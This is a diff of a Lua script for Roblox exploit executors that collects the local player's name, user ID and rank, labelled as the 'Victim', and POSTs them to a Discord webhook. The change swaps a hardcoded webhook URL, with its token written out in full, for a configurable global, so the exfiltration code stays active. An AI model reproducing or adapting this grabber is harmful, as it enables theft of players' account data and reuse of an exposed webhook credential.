@@ -38,7 +38,6 @@ end
 local webhookcolor = "16711680"
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
-_G.UserNamey = "Paxz On Top"
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
@@ -91,7 +90,7 @@ local msg = {
   },
 	["attachments"] = {}
   }
-  local Webhook = "https://discord.com/api/webhooks/1117121047985131621/9b7Gy-8IOUy7_7zroEtKGzPm0rz4XLRumUA-pjvN-bR08vVAM5CGcD9ZH6njqMn8tMiW"
+  local Webhook = _G.MainWebhook
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
   end
